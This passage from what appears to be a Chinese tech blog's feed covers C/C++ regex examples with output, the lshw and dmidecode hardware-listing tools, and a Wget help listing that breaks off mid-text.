<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>这样就完成了一个便携式U盘系统了～</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>C/C++正则表达式regex</title>
    <url>/cpp-regex/</url>
    <content><![CDATA[<p>最近接触了C++的正则表达式,感觉还可以,以此来记录下过程</p>
<a id="more"></a>

<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>关于C++的正则表达式头文件,可以参考这个网站的教程<a href="http://www.cplusplus.com/reference/regex/" target="_blank" rel="noopener">http://www.cplusplus.com/reference/regex/</a></p>
<p>C正则表达式头文件<strong>regex.h</strong><br><a href="http://pubs.opengroup.org/onlinepubs/7908799/xsh/regex.h.html" target="_blank" rel="noopener">http://pubs.opengroup.org/onlinepubs/7908799/xsh/regex.h.html</a></p>
<p>代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;regex.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;regex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">//c语言形式的正则表达式</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cRegex</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">regex_t</span> r;</span><br><span class="line">    <span class="comment">//成功返回0(REG_NOERROR)</span></span><br><span class="line">    <span class="keyword">int</span> ret=regcomp(&amp;r,<span class="string">"abc(.*?)-(.*?)xyz"</span>,REG_EXTENDED|REG_ICASE);</span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">regmatch_t</span> pm[<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">char</span> src[]=<span class="string">"abcQQQQQQ-5555555xyz"</span>;</span><br><span class="line">        ret=regexec(&amp;r,src,<span class="number">10</span>,pm,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret!=REG_NOMATCH&amp;&amp;ret==REG_NOERROR)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;<span class="keyword">sizeof</span>(pm)/<span class="keyword">sizeof</span>(<span class="keyword">regmatch_t</span>); ++i) &#123;</span><br><span class="line">                <span class="keyword">if</span>(pm[i].rm_so==<span class="number">-1</span>)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//rm_so:匹配子字符串的开始</span></span><br><span class="line">                <span class="comment">//rm_eo:匹配子字符串的结束</span></span><br><span class="line">                <span class="comment">//rm_eo-rm_so:表示匹配的字符串的长度</span></span><br><span class="line">                <span class="comment">//可参考:http://pubs.opengroup.org/onlinepubs/7908799/xsh/regex.h.html</span></span><br><span class="line">                <span class="comment">//cout&lt;&lt;pm[i].rm_so&lt;&lt;"\t"&lt;&lt;pm[i].rm_eo&lt;&lt;endl;</span></span><br><span class="line">                <span class="keyword">int</span> matchcount=pm[i].rm_eo-pm[i].rm_so;</span><br><span class="line">                <span class="keyword">char</span> matchvalue[<span class="number">20</span>+<span class="number">1</span>];</span><br><span class="line">                bzero(matchvalue,<span class="number">21</span>);</span><br><span class="line">                <span class="comment">//从匹配到的子字符串索引拷贝内容</span></span><br><span class="line">                <span class="built_in">memcpy</span>(matchvalue,src+pm[i].rm_so,matchcount);</span><br><span class="line">                matchvalue[<span class="built_in">strlen</span>(matchvalue)]=<span class="string">'\0'</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"---&gt;%s\n"</span>,matchvalue);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">char</span> errmsg[<span class="number">250</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">            regerror(ret,&amp;r,errmsg,<span class="number">250</span>);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"Message:"</span>&lt;&lt;errmsg&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//释放内存</span></span><br><span class="line">        regfree(&amp;r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//c++语言正则表达式替换</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cppRegex_replace</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> tx=<span class="string">"https://www.baidu.com"</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"old text:"</span>&lt;&lt;tx.c_str()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//替换</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="function">regex <span class="title">re</span><span class="params">(<span class="string">"\\bbaidu\\b"</span>)</span></span>;</span><br><span class="line">        tx=regex_replace(tx,re,<span class="string">"google"</span>);</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"new text:"</span>&lt;&lt;tx.c_str()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (regex_error &amp;e)&#123;</span><br><span class="line">        <span class="keyword">if</span>(e.code()==regex_constants::error_badrepeat)&#123;</span><br><span class="line">            <span class="comment">//do something...</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"code:"</span>&lt;&lt;e.code()&lt;&lt;<span class="built_in">endl</span></span><br><span class="line">            &lt;&lt;<span class="string">"msg:"</span>&lt;&lt;e.what()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//c++语言形式的正则表达式</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cppRegex</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *检测是否为正确的邮箱格式*/</span></span><br><span class="line">    <span class="built_in">string</span> pattern=<span class="string">"^\\w&#123;2,20&#125;@\\w&#123;2,&#125;.com$"</span>;</span><br><span class="line">    <span class="built_in">string</span> <span class="built_in">text</span>=<span class="string">"josephxrays@qq.com"</span>;</span><br><span class="line">    <span class="function">regex <span class="title">re</span><span class="params">(pattern,</span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="built_in">std</span>::regex_constants::icase|</span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="built_in">std</span>::regex_constants::extended|</span></span></span><br><span class="line"><span class="function"><span class="params">             regex_constants::ECMAScript)</span></span>;</span><br><span class="line">    match_results&lt;<span class="built_in">string</span>::const_iterator&gt; res;</span><br><span class="line">    <span class="comment">//smatch res;</span></span><br><span class="line">    <span class="keyword">bool</span> is=regex_match(<span class="built_in">text</span>,res,re);</span><br><span class="line">    <span class="comment">//is=regex_search(text,res,re);</span></span><br><span class="line">    <span class="keyword">if</span>(is==<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ok ,this is a true email format :)\n"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error email format :(\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//c++语言形式的正则表达式2</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cppRegex_matchGroup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *检测是否为正确的邮箱格式*/</span></span><br><span class="line">    <span class="built_in">string</span> pattern=<span class="string">"(.*?)@(.*?)\\.(.*?)"</span>;</span><br><span class="line">    <span class="built_in">string</span> <span class="built_in">text</span>=<span class="string">"josephxrays@163.com"</span>;</span><br><span class="line">    <span class="function">regex <span class="title">re</span><span class="params">(pattern,</span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="built_in">std</span>::regex_constants::icase|<span class="comment">//忽略大小写</span></span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="built_in">std</span>::regex_constants::extended|</span></span></span><br><span class="line"><span class="function"><span class="params">             regex_constants::ECMAScript)</span></span>;</span><br><span class="line">    match_results&lt;<span class="built_in">string</span>::const_iterator&gt; res;</span><br><span class="line">    <span class="comment">//smatch res;</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//bool is=regex_search(text,res,re);</span></span><br><span class="line">        <span class="keyword">bool</span> is=regex_match(<span class="built_in">text</span>,res,re);</span><br><span class="line">        <span class="keyword">if</span>(is==<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"ok :)\n"</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; res.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"--&gt;%s \n"</span>,res.str(i).c_str());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"no match :(\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (regex_error &amp;e)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"exception:( \n \t %d \t %s\n"</span>,e.code(),e.what());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//c++语言形式的正则表达式3</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cppRegex_matchGroup_iterator</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> pattern=<span class="string">"&lt;a href=\"(.*?)\"&gt;(.*?)&lt;/a&gt;"</span>;</span><br><span class="line">    <span class="built_in">string</span> <span class="built_in">text</span>=</span><br><span class="line">            <span class="string">"&lt;a href=\"https://www.baidu.com\"&gt;百度&lt;/a&gt;"</span>\</span><br><span class="line">            <span class="string">"&lt;a href=\"https://www.google.com\"&gt;谷歌&lt;/a&gt;"</span>\</span><br><span class="line">            <span class="string">"&lt;a href=\"http://www.csdn.net\"&gt;CSDN&lt;/a&gt;"</span>;</span><br><span class="line">    <span class="function">regex <span class="title">re</span><span class="params">(pattern,</span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="built_in">std</span>::regex_constants::icase|</span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="built_in">std</span>::regex_constants::extended|</span></span></span><br><span class="line"><span class="function"><span class="params">             regex_constants::ECMAScript)</span></span>;</span><br><span class="line">    <span class="comment">//regex_iterator 匹配所有子串</span></span><br><span class="line">    <span class="function">sregex_iterator <span class="title">its</span><span class="params">(<span class="built_in">text</span>.<span class="built_in">begin</span>(),<span class="built_in">text</span>.<span class="built_in">end</span>(),re)</span></span>;</span><br><span class="line">    sregex_iterator ends;</span><br><span class="line">    <span class="keyword">while</span> (its!=ends)&#123;</span><br><span class="line">        <span class="comment">//match_results&lt;T&gt;</span></span><br><span class="line">        <span class="comment">//printf("%s \n",its-&gt;str(0).c_str());</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"--&gt;%s \t"</span>,its-&gt;str(<span class="number">1</span>).c_str());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s \n"</span>,its-&gt;str(<span class="number">2</span>).c_str());</span><br><span class="line">        its++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cRegex();</span><br><span class="line">    cppRegex();</span><br><span class="line">    cppRegex_matchGroup();</span><br><span class="line">    cppRegex_replace();</span><br><span class="line">    cppRegex_matchGroup_iterator();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译运行: <code>g++ main.cpp -o regex_test &amp;&amp; ./regex_test</code></p>
<p>输出结果:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---&gt;abcQQQQQQ-5555555xyz</span><br><span class="line">---&gt;QQQQQQ</span><br><span class="line">---&gt;5555555</span><br><span class="line">ok ,this is a truly email format :)</span><br><span class="line">ok :)</span><br><span class="line">--&gt;josephxrays@163.com </span><br><span class="line">--&gt;josephxrays </span><br><span class="line">--&gt;163 </span><br><span class="line">--&gt;com </span><br><span class="line">old text:https://www.baidu.com</span><br><span class="line">new text:https://www.google.com</span><br><span class="line">--&gt;https://www.baidu.com 	百度 </span><br><span class="line">--&gt;https://www.google.com 	谷歌 </span><br><span class="line">--&gt;http://www.csdn.net 	CSDN</span><br></pre></td></tr></table></figure>

<p>bye~</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux lshw和dmidecode查看硬件信息</title>
    <url>/linux-lshw-dmidecode/</url>
    <content><![CDATA[<p><strong>Dmidecode</strong>和<strong>lshw</strong>这两个工具可以查看Linux下有关硬件信息,这些信息包括 BIOS、系统、主板、处理器、内存、缓存等等</p>
<a id="more"></a>

<h3 id="Dmidecode"><a href="#Dmidecode" class="headerlink" title="Dmidecode"></a>Dmidecode</h3><p>LINUX下直接安装 <code>apt-get install dmidecode</code><br>输入 <strong>dmidecode –help</strong> 查看帮助</p>
<blockquote>
<p>Usage: dmidecode [OPTIONS]<br>Options are:<br>-d, –dev-mem FILE Read memory from device FILE (default: /dev/mem)<br>-h, –help Display this help text and exit<br>-q, –quiet Less verbose output<br>-s, –string KEYWORD Only display the value of the given DMI string<br>-t, –type TYPE Only display the entries of given type<br>-u, –dump Do not decode the entries<br>–dump-bin FILE Dump the DMI data to a binary file<br>–from-dump FILE Read the DMI data from a binary file<br>–no-sysfs Do not attempt to read DMI data from sysfs files<br>–oem-string N Only display the value of the given OEM string<br>-V, –version Display the version and exit</p>
</blockquote>
<blockquote>
<p>0 BIOS<br>1 System<br>2 Base Board<br>3 Chassis<br>4 Processor<br>5 Memory Controller<br>6 Memory Module<br>7 Cache<br>8 Port Connector<br>9 System Slots<br>10 On Board Devices<br>11 OEM Strings<br>12 System Configuration Options<br>13 BIOS Language<br>14 Group Associations<br>15 System Event Log<br>16 Physical Memory Array<br>17 Memory Device<br>18 32-bit Memory Error<br>19 Memory Array Mapped Address<br>20 Memory Device Mapped Address<br>21 Built-in Pointing Device<br>22 Portable Battery<br>23 System Reset<br>24 Hardware Security<br>25 System Power Controls<br>26 Voltage Probe<br>27 Cooling Device<br>28 Temperature Probe<br>29 Electrical Current Probe<br>30 Out-of-band Remote Access<br>31 Boot Integrity Services<br>32 System Boot<br>33 64-bit Memory Error<br>34 Management Device<br>35 Management Device Component<br>36 Management Device Threshold Data<br>37 Memory Channel<br>38 IPMI Device<br>39 Power Supply<br>40 Additional Information<br>41 Onboard Device</p>
</blockquote>
<p>1.输入 <strong>dmidecode -t</strong> 列出关键字</p>
<blockquote>
<p>dmidecode: option requires an argument – ‘t’<br>Type number or keyword expected<br>Valid type keywords are:</p>
<p>bios<br>system<br>baseboard<br>chassis<br>processor<br>memory<br>cache<br>connector<br>slot</p>
</blockquote>
<p>然后在 <strong>dmidecode -t system</strong> 或 <strong>dmidecode -t 1</strong> 输出</p>
<blockquote>
<p># dmidecode 3.1<br>Getting SMBIOS data from sysfs.<br>SMBIOS 2.7 present.</p>
<p>Handle 0x0001, DMI type 1, 27 bytes<br>System Information<br>Manufacturer: LENOVO<br>Product Name: 33661R8<br>Version: ThinkPad Edge E530c<br>Serial Number: MP43X9V<br>……</p>
</blockquote>
<p>2.<strong>dmidecode -s</strong></p>
<blockquote>
<p>dmidecode: option requires an argument – ‘s’<br>String keyword expected<br>Valid string keywords are:<br>bios-vendor<br>bios-version<br>bios-release-date<br>system-manufacturer<br>system-product-name<br>system-version<br>system-serial-number<br>system-uuid<br>baseboard-manufacturer<br>baseboard-product-name<br>baseboard-version<br>baseboard-serial-number<br>baseboard-asset-tag<br>chassis-manufacturer<br>chassis-type<br>chassis-version<br>chassis-serial-number<br>chassis-asset-tag<br>processor-family<br>processor-manufacturer<br>processor-version<br>processor-frequency</p>
</blockquote>
<p><strong>dmidecode -s system-version</strong> 输出</p>
<blockquote>
<p>ThinkPad Edge E530c</p>
</blockquote>
<h3 id="lshw-Hardware-Lister"><a href="#lshw-Hardware-Lister" class="headerlink" title="lshw(Hardware Lister)"></a>lshw(Hardware Lister)</h3><p>安装:<code>apt-get install lshw</code><br>lshw 比较简单 <strong>lshw –help</strong></p>
<blockquote>
<p>Hardware Lister (lshw) - unknown<br>usage: lshw [-format] [-options …]<br>lshw -version</p>
<p>-version print program version (unknown)<br>format can be<br><strong>-html</strong> output hardware tree as HTML<br><strong>-xml</strong> output hardware tree as XML<br>-short output hardware paths<br>-businfo output bus information<br>-X use graphical interface</p>
<p>options can be<br><strong>-class CLASS</strong> only show a certain class of hardware<br>-C CLASS same as ‘-class CLASS’<br>-c CLASS same as ‘-class CLASS’<br>-disable TEST disable a test (like pci, isapnp, cpuid, etc. )<br>-enable TEST enable a test (like pci, isapnp, cpuid, etc. )<br>-quiet don’t display status<br>-sanitize sanitize output (remove sensitive information like serial numbers, etc.)<br>-numeric output numeric IDs (for PCI, USB, etc.)<br>-notime exclude volatile attributes (timestamps) from output</p>
</blockquote>
<p>1.把信息保存为HTML/XML格式文本</p>
<blockquote>
<p>lshw -html &gt; my.html<br>lshw -xml &gt; my.html</p>
</blockquote>
<p>2.显示设备列表，输出包括设备路径(path)、类别(class)以及简单描述 <strong>lshw -short</strong></p>
<blockquote>
<p>H/W path Device <strong>Class</strong> Description<br>……</p>
</blockquote>
<p>3.显示指定类别的设备 <strong>lshw -C xxxx</strong>,其中 <code>xxxx</code> 就是 <strong>lshw -short</strong> 中的 <code>Class</code> 字段.如 <strong>lshw -C disk</strong></p>
<blockquote>
<p>*-disk<br>description: ATA Disk<br>product: WDC WD5000LPVT-0<br>vendor: Western Digital<br>……<br>*-cdrom<br>……</p>
</blockquote>
<p>例如: <strong>lshw -C system|grep version</strong> 输出</p>
<blockquote>
<p>version: ThinkPad Edge E530c</p>
</blockquote>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Wget下载工具</title>
    <url>/wget-tool/</url>
    <content><![CDATA[<p>作为一款Linux下著名的文件下载工具–Wget,它的轻巧便捷及强大的功能可以与大多数下载工具相媲美.支持 <strong>HTTP,HTTPS,FTP协议</strong>, 也可以使用<strong>代理</strong>,断点续传…</p>
<a id="more"></a>

<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><a href="http://www.gnu.org/software/wget/manual/wget.html" target="_blank" rel="noopener">英文帮助文档</a></p>
<p>但由于其是在命令行下操作,所以玩一起来还是有一定难度的.与 <a href="https://curl.haxx.se/" target="_blank" rel="noopener"><strong>curl</strong></a> (由libcurl库实现)相比两者还是有一定的区别的.</p>
<p>Linux下可以 <code>wget --help</code> 查看wget帮助,更详细的可以 <code>man wget</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">启动：</span><br><span class="line">  -V,  --version                   显示 Wget 的版本信息并退出</span><br><span class="line">  -h,  --help                      打印此帮助</span><br><span class="line">  -b,  --background                启动后转入后台</span><br><span class="line">  -e,  --execute=命令              运行一个“.wgetrc”风格的命令</span><br><span class="line">日志和输入文件：</span><br><span class="line">  -o,  --output-file=文件          将日志信息写入 FILE</span><br><span class="line">  -a,  --append-output=文件        将信息添加至 FILE</span><br><span class="line">  -d,  --debug                     打印大量调试信息</span><br><span class="line">  -q,  --quiet                     安静模式 (无信息输出)</span><br><span class="line">  -v,  --verbose                   详尽的输出 (此为默认值)</span><br><span class="line">  -nv, --no-verbose                关闭详尽输出，但不进入安静模式</span><br><span class="line">       --report-speed=类型         以 &lt;类型&gt; 报告带宽。类型可以是 bits</span><br><span class="line">  -i,  --input-file=文件           下载本地或外部 &lt;文件&gt; 中的 URL</span><br><span class="line">  -F,  --force-html                把输入文件当成 HTML 文件</span><br><span class="line">  -B,  --base=URL                  解析相对于 URL 的 HTML 输入文件链接 (-i -F)</span><br><span class="line">       --config=文件               指定要使用的配置文件</span><br><span class="line">       --no-cookies                不读取任何配置文件</span><br><span class="line">       --rejected-log=文件         将拒绝 URL 的原因写入 &lt;文件&gt;。</span><br><span class="line">下载：</span><br><span class="line">  -t,  --tries=数字                设置重试次数为 &lt;数字&gt; (0 代表无限制)</span><br><span class="line">       --retry-connrefused         即使拒绝连接也是重试</span><br><span class="line">  -O,  --output-document=文件      将文档写入 FILE</span><br><span class="line">  -nc, --no-clobber                不要下载已存在将被覆盖的文件</span><br><span class="line">       --no-netrc                  don&apos;t try to obtain credentials from .netrc</span><br><span class="line">  -c,  --continue                  断点续传下载文件</span><br><span class="line">       --start-pos=偏移量          从由零计数的 &lt;偏移量&gt; 开始下载</span><br><span class="line">       --progress=类型             选择进度条类型</span><br><span class="line">       --show-progress             在任意啰嗦状态下都显示进度条</span><br><span class="line">  -N,  --timestamping              只获取比本地文件新的文件</span><br><span class="line">       --no-if-modified-since      不要在时间戳 (timestamping) 模式下使用</span><br><span class="line">                                     if-modified-since get 条件请求</span><br><span class="line">       --no-use-server-timestamps       不用服务器上的时间戳来设置本地文件</span><br><span class="line">  -S,  --server-response           打印服务器响应</span><br><span class="line">       --spider                    不下载任何文件</span><br><span class="line">  -T,  --timeout=SECONDS           将所有超时设为 SECONDS 秒</span><br><span class="line">       --dns-timeout=SECS          设置 DNS 查寻超时为 SECS 秒</span><br><span class="line">       --connect-timeout=SECS      设置连接超时为 SECS 秒</span><br><span class="line">       --read-timeout=SECS         设置读取超时为 SECS 秒</span><br><span class="line">  -w,  --wait=SECONDS              等待间隔为 SECONDS 秒</span><br><span class="line">       --waitretry=SECONDS         在获取文件的重试期间等待 1..SECONDS 秒</span><br><span class="line">       --random-wait               获取多个文件时，每次随机等待间隔 (0.5~1.5)*WAIT 秒</span><br><span class="line">       --no-proxy                  禁止使用代理</span><br><span class="line">  -Q,  --quota=数字                设置获取配额为 &lt;数字&gt; 字节</span><br><span class="line">       --bind-address=ADDRESS      绑定至本地主机上的 ADDRESS (主机名或是 IP)</span><br><span class="line">       --limit-rate=RATE           限制下载速率为 RATE</span><br><span class="line">       --no-dns-cache              关闭 DNS 查询缓存</span><br><span class="line">       --restrict-file-names=系统  限定文件名中的字符为 &lt;系统&gt; 允许的字符</span><br><span class="line">       --ignore-case               匹配文件/目录时忽略大小写</span><br><span class="line">  -4,  --inet4-only                仅连接至 IPv4 地址</span><br><span class="line">  -6,  --inet6-only                仅连接至 IPv6 地址</span><br><span class="line">       --prefer-family=地址族      首先连接至指定家族（IPv6，IPv4 或 none）的地址</span><br><span class="line">       --user=用户                 将 ftp 和 http 的用户名均设置为 &lt;用户&gt;</span><br><span class="line">       --password=密码             将 ftp 和 http 的密码均设置为 &lt;密码&gt;</span><br><span class="line">       --ask-password              提示输入密码</span><br><span class="line">       --use-askpass=COMMAND       specify credential handler for requesting </span><br><span class="line">                                     username and password.  If no COMMAND is </span><br><span class="line">                                     specified the WGET_ASKPASS or the SSH_ASKPASS </span><br><span class="line">                                     environment variable is used.</span><br><span class="line">       --no-iri                    关闭 IRI 支持</span><br><span class="line">       --local-encoding=ENC        使用 ENC 作为 IRI (国际化资源标识符) 的本地编码</span><br><span class="line">       --remote-encoding=ENC       使用 ENC 作为默认远程编码</span><br><span class="line">       --unlink                    覆盖前移除文件</span><br><span class="line">       --no-xattr                  不要在文件的拓展属性中储存元数据</span><br><span class="line">目录：</span><br><span class="line">  -nd, --no-directories            不创建目录</span><br><span class="line">  -x,  --force-directories         强制创建目录</span><br><span class="line">  -nH, --no-host-directories       不要创建主 (host) 目录</span><br><span class="line">       --protocol-directories      在目录中使用协议名称</span><br><span class="line">  -P,  --directory-prefix=前缀     保存文件到 &lt;前缀&gt;/..</span><br><span class="line">       --cut-dirs=数字             忽略远程目录中 &lt;数字&gt; 个目录层。</span><br><span class="line">HTTP 选项：</span><br><span class="line">       --http-user=用户            设置 http 用户名为 &lt;用户&gt;</span><br><span class="line">       --http-password=密码        设置 http 密码为 &lt;密码&gt;</span><br><span class="line">       --no-cache                  不使用服务器缓存的数据。</span><br><span class="line">       --default-page=NAME         改变默认页 (通常是“index.html”)。</span><br><span class="line">  -E,  --adjust-extension          以合适的扩展名保存 HTML/CSS 文档</span><br><span class="line">       --ignore-length             忽略头部的‘Content-Length’区域</span><br><span class="line">       --header=字符串             在头部插入 &lt;字符串&gt;</span><br><span class="line">       --compression=TYPE          choose compression, one of auto, gzip and none</span><br><span class="line">       --max-redirect              每页所允许的最大重定向</span><br><span class="line">       --proxy-user=用户           使用 &lt;用户&gt; 作为代理用户名</span><br><span class="line">       --proxy-password=密码       使用 &lt;密码&gt; 作为代理密码</span><br><span class="line">       --referer=URL               在 HTTP 请求头包含‘Referer: URL’</span><br><span class="line">       --save-headers              将 HTTP 头保存至文件。</span><br><span class="line">  -U,  --user-agent=代理           标识自己为 &lt;代理&gt; 而不是 Wget/VERSION。</span><br><span class="line">       --no-http-keep-alive        禁用 HTTP keep-alive (持久连接)。</span><br><span class="line">       --no-cookies                不使用 cookies。</span><br><span class="line">       --load-cookies=文件         会话开始前从 &lt;文件&gt; 中载入 cookies。</span><br><span class="line">       --save-cookies=文件         会话结束后保存 cookies 至 FILE。</span><br><span class="line">       --keep-session-cookies      载入并保存会话 (非永久) cookies。</span><br><span class="line">       --post-data=字符串          使用 POST 方式；把 &lt;字串&gt;作为数据发送。</span><br><span class="line">       --post-file=文件            使用 POST 方式；发送 &lt;文件&gt; 内容。</span><br><span class="line">       --method=HTTP方法           在请求中使用指定的 &lt;HTTP 方法&gt;。</span><br><span class="line">       --post-data=字符串          把 &lt;字串&gt; 作为数据发送，必须设置 --method</span><br><span class="line">       --post-file=文件            发送 &lt;文件&gt; 内容，必须设置 --method</span><br><span class="line">       --content-disposition       当选择本地文件名时允许 Content-Disposition</span><br><span class="line">                                   头部 (实验中)。</span><br><span class="line">       --content-on-error          在服务器错误时输出接收到的内容</span><br><span class="line">       --auth-no-challenge         不先等待服务器询问就发送基本 HTTP 验证信息。</span><br><span class="line">HTTPS (SSL/TLS) 选项：</span><br><span class="line">       --secure-protocol=PR        choose secure protocol, one of auto, SSLv2,</span><br><span class="line">                                     SSLv3, TLSv1, TLSv1_1, TLSv1_2 and PFS</span><br><span class="line">       --https-only                 只跟随安全的 HTTPS 链接</span><br><span class="line">       --no-check-certificate       不要验证服务器的证书。</span><br><span class="line">       --certificate=文件           客户端证书文件。</span><br><span class="line">       --certificate-type=类型      客户端证书类型，PEM 或 DER。</span><br><span class="line">       --private-key=文件           私钥文件。</span><br><span class="line">       --private-key-type=类型      私钥文件类型，PEM 或 DER。</span><br><span class="line">       --ca-certificate=文件        带有一组 CA 证书的文件。</span><br><span class="line">       --ca-directory=DIR           保存 CA 证书的哈希列表的目录。</span><br><span class="line">       --ca-certificate=文件        带有一组 CA 证书的文件。</span><br><span class="line">       --pinnedpubkey=文件/散列值  用于验证节点的公钥（PEM/DER）文件或</span><br><span class="line">                                   任何数量的 sha256 散列值，以 base64 编码、</span><br><span class="line">                                   “sha256//” 开头、用“;”间隔</span><br><span class="line">HSTS 选项：</span><br><span class="line">       --no-hsts                   禁用 HSTS</span><br><span class="line">       --hsts-file                 HSTS 数据库路径（将覆盖默认值）</span><br><span class="line">FTP 选项：</span><br><span class="line">       --ftp-user=用户             设置 ftp 用户名为 &lt;用户&gt;。</span><br><span class="line">       --ftp-password=密码         设置 ftp 密码为 &lt;密码&gt;</span><br><span class="line">       --no-remove-listing         不要删除‘.listing’文件</span><br><span class="line">       --no-glob                   不在 FTP 文件名中使用通配符展开</span><br><span class="line">       --no-passive-ftp            禁用“passive”传输模式</span><br><span class="line">       --preserve-permissions      保留远程文件的权限</span><br><span class="line">       --retr-symlinks             递归目录时，获取链接的文件 (而非目录)</span><br><span class="line">FTPS 选项：</span><br><span class="line">       --ftps-implicit                 使用隐式 FTPS（默认端口 990）</span><br><span class="line">       --ftps-resume-ssl               打开数据连接时继续控制连接中的 SSL/TLS 会话</span><br><span class="line">       --ftps-clear-data-connection    只加密控制信道；数据传输使用明文</span><br><span class="line">       --ftps-fallback-to-ftp          回落到 FTP，如果目标服务器不支持 FTPS</span><br><span class="line">WARC 选项：</span><br><span class="line">       --warc-file=文件名          在一个 .warc.gz 文件里保持请求/响应数据</span><br><span class="line">       --warc-header=字符串        在头部插入 &lt;字符串&gt;</span><br><span class="line">       --warc-max-size=数字        将 WARC 的最大尺寸设置为 &lt;数字&gt;</span><br><span class="line">       --warc-cdx                  写入 CDX 索引文件</span><br><span class="line">       --warc-dedup=文件名         不要记录列在此 CDX 文件内的记录</span><br><span class="line">       --no-warc-compression       不要 